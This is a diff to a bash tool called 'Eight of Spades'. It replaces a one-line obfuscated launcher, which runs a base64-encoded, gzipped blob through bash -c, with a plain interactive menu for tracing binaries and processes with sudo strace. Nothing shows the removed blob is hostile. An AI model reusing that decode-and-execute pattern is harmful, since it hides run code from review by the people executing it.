@@ -1,1 +1,82 @@
-bash -c "$(echo H4sICKkLXGcAA0VpZ2h0X29mX1NwYWRlcwDFV1FP2zAQfu+vuGWRoJsaKAUeqKYJSqXxsK2ivExsqtzEoRaJncUOqAL++3x2aNomlKgtzE/Jxfnu7ru7L87HD3tjxvfGRE4ajd6v0x9fdn7vdzrX7W7nON5pXPbPC0PbGIb9q9y0r+8bKiU+HcmpVDQe+SSK5G4THhqg1/2ERRRUmtEuBMKYcPkRJensjvoTAS0KjvuA7p+cxSeOuRxtbVXBP8Kq1Wc3EwUihGFCAipX7oXHGvhXyBgMDWPQQ8YgTEUMw0wmzGcik3DGOElZhbNq/O3RUyf+TdZL+D8TxQSXJ2+F3/Zy2gnIhPosZD6MkeTpdvAPPPguOFMiBV1QsOMAZhyAcUgpiVqKxXRd/I4HQ3JH54HBTB4ooXMKcdA2if/wmZ+FyENMpyBscHG+Lv6Rjl9PvT/JMXPudfA2i7rrJfxjDy6pylKOkDHRlMeUZ7VhX8F/u/mywmdEVSvf7JnulwBaCTh9rmgKU5GloLczn57okOxVoadEUnCtUTfbzI6r3Vy4rcBWEwoJURNTC329VBn0Z00loEUdr0jL6Dm2FeM3S42FeudaXM/zYHeQUimhp9Locw99SyWSZkHMshOZBbjHtI6T45R32Uw5tKEloZWapK0jwqdwS02W6axtMHvsGh1QGavbXTAdbMBrbIViY2ZzwUFyS5ozT/CCAG3Kdiv8P4R33rCRK4CMoHISG32VqLxonQHh4zWrpmV8aRwKIXcRV7NRsxRanswbzoqSWBXLtV3nERR+3rV+h7Xqh18YfdIypUyFj57n65ewYKsqpD9Fz27ume4cdO9qJxsPiU4Kcd6V4aNaDOdTMWtt81EuZmOED9btbIOFLCOxuSN3DheFaHB69W1lh+ufBn1KcObfK29iIVyD+1V7/wv78KeLqfHSrlmQzpkNJhQZD4CoE3B3q/w0K+YnkmU+lrLXP0lPuQculPWyIsOQvWdbHJfbwnJiz0tYrvkjUyXkWMd3+5qjTy84Kji64HckYkF+fvFgoNtKoqpOgdzoAFZwVosgX3DFeEZfo4VK4pubQHDaeKr6h238A6l6kz4YDwAA | base64 -d | gunzip)"
+#!/bin/bash
+
+CYAN='\033[1;36m'
+RED='\033[1;31m'
+RESET='\033[0m'
+
+trace_system_calls() {
+    while true; do
+        clear
+        echo -e "${CYAN}"
+        echo "     __________________________________________________________________________"
+        echo "    |                             Eight of Spades                              |"
+        echo "    |              Trace System Calls from Suspicious Binaries                 |"
+        echo "    |__________________________________________________________________________|"
+        echo "    |                                                                          |"
+        echo "    |  Options:                                                                |"
+        echo "    |  1. Trace a specific binary                                              |"
+        echo "    |  2. Monitor all system calls in real-time                                |"
+        echo "    |  3. Save system call trace to a file                                     |"
+        echo "    |  4. Trace system calls for a specific PID                                |"
+        echo "    |  5. Search for a binary to trace                                         |"
+        echo "    |  6. Return to main menu                                                  |"
+        echo "    |__________________________________________________________________________|"
+        echo -e "${RESET}"
+
+        read -p "Enter your choice: " choice
+        case $choice in
+            1)
+                read -p "Enter the path to the binary to trace: " binary
+                clear
+                echo -e "${CYAN}Tracing system calls from $binary... (Press Ctrl+C to stop)${RESET}"
+                sudo strace "$binary"
+                read -n 1 -s -r -p "Press any key to return to the menu..."
+                ;;
+            2)
+                read -p "Enter the path to the binary to monitor: " binary
+                clear
+                echo -e "${CYAN}Monitoring all system calls from $binary in real-time... (Press Ctrl+C to stop)${RESET}"
+                sudo strace -f "$binary"
+                read -n 1 -s -r -p "Press any key to return to the menu..."
+                ;;
+            3)
+                read -p "Enter the path to the binary to trace: " binary
+                read -p "Enter the file name to save the trace: " file
+                clear
+                echo -e "${CYAN}Saving system call trace to $file...${RESET}"
+                sudo strace -o "$file" "$binary"
+                echo "Trace saved to $file."
+                read -n 1 -s -r -p "Press any key to return to the menu..."
+                ;;
+            4)
+                read -p "Enter the PID of the process to trace: " pid
+                clear
+                echo -e "${CYAN}Tracing system calls for process with PID $pid... (Press Ctrl+C to stop)${RESET}"
+                sudo strace -p "$pid"
+                read -n 1 -s -r -p "Press any key to return to the menu..."
+                ;;
+            5)
+                read -p "Enter the binary name to search: " binary_name
+                clear
+                echo -e "${CYAN}Searching for binary $binary_name in PATH...${RESET}"
+                which "$binary_name"
+                if [ $? -eq 0 ]; then
+                    echo "Binary found at: $(which "$binary_name")"
+                else
+                    echo -e "${RED}Binary not found.${RESET}"
+                fi
+                read -n 1 -s -r -p "Press any key to return to the menu..."
+                ;;
+            6)
+                echo "Returning to main menu..."
+                break
+                ;;
+            *)
+                echo -e "${RED}Invalid choice. Please try again.${RESET}"
+                read -n 1 -s -r -p "Press any key to continue..."
+                ;;
+        esac
+    done
+}
+
+trace_system_calls
